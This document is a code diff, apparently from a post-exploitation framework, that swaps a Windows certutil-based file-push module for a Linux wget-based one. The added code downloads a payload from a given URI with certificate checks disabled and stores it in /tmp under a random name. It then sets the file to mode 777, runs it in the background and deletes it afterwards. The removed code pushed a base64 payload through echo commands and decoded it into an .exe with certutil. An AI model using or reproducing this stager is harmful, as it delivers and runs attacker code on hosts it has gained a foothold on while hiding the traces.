@@ -28,16 +28,16 @@ from alive_progress import alive_bar
 from pex.string import String
 
 
-class Certutil(object):
+class Wget(object):
     """ Subclass of pex.post.push module.
 
     This subclass of pex.post.push module is intended for providing
-    implementation of certutil method of pushing file to sender.
+    implementation of wget method of pushing file to sender.
     """
 
     def __init__(self, sender: Callable[..., Any],
                  config: dict = {}) -> None:
-        """ Initialize certutil method.
+        """ Initialize wget method.
 
         :param Callable[..., Any] sender: sender to execute commands on
         :param dict config: configuration for method
@@ -48,47 +48,64 @@ class Certutil(object):
         self.sender = sender
 
         self.config = {
+            'path': '/tmp',
             'location': None,
             'linemax': 1024,
-            'data': b''
+            'uri': None,
+            'concat': ' ; ',
+            'background': True,
+            'delete': True,
+            'args': None,
+            'interpreter': None,
+            'debug': False
         }
         self.config.update(config)
 
+        if not self.config['uri']:
+            raise RuntimeError("Wget: No URI specified!")
+
         self.config['location'] = self.config['location'] or \
-            '%TEMP%\\' + String().random_string(8)
+            self.config['path'] + '/' + String().random_string(8)
+
+    def exec(self) -> None:
+        """ Execute pushed file.
+
+        :return None: None
+        """
+
+        if self.config['interpreter']:
+            cmds = [
+                f"{self.config['interpreter']}"
+                f"{self.config['location']}"
+                f"{' ' + self.config['args'] if self.config['args'] else ''}"
+                f"{' & echo' if self.config['background'] else ''}"
+            ]
+        else:
+            cmds = [
+                f"chmod 777 {self.config['location']}",
+                f"{self.config['location']}"
+                f"{' ' + self.config['args'] if self.config['args'] else ''}"
+                f"{' & echo' if self.config['background'] else ''}"
+            ]
+
+        if self.config['delete']:
+            cmds.append(f"rm -f {self.config['location']}")
+
+        command = self.config['concat'].join(cmds)
+
+        if self.config['debug']:
+            print(command)
+
+        self.sender(command)
 
     def push(self) -> str:
-        """ Push file to sender using bash echo method.
+        """ Push file to sender using wget method.
 
-        :param Callable[..., Any] sender: sender to push file to
         :return str: location of new file
         """
 
-        data = self.config['data']
-        location = self.config['location']
+        command = "wget -qO {} --no-check-certificate {}"
+        command = command.format(self.config['location'], self.config['uri'])
 
-        decode_stream = "certutil -decode {}.b64 {}.exe & del {}.b64"
-
-        echo_stream = "echo {} >> {}.b64"
-        echo_max_length = self.config['linemax']
-
-        data = String().base64_string(data, decode=False)
-
-        size = len(data)
-        num_parts = int(size / echo_max_length) + 1
-
-        with alive_bar(num_parts, receipt=False, ctrl_c=False, title="Pushing") as bar:
-            for i in range(0, num_parts):
-                bar()
-
-                current = i * echo_max_length
-                block = data[current:current + echo_max_length]
-
-                if block:
-                    command = echo_stream.format(block, location)
-                    self.sender(command)
-
-        command = decode_stream.format(location, location, location)
         self.sender(command)
-
-        return location
+        return self.config['location']
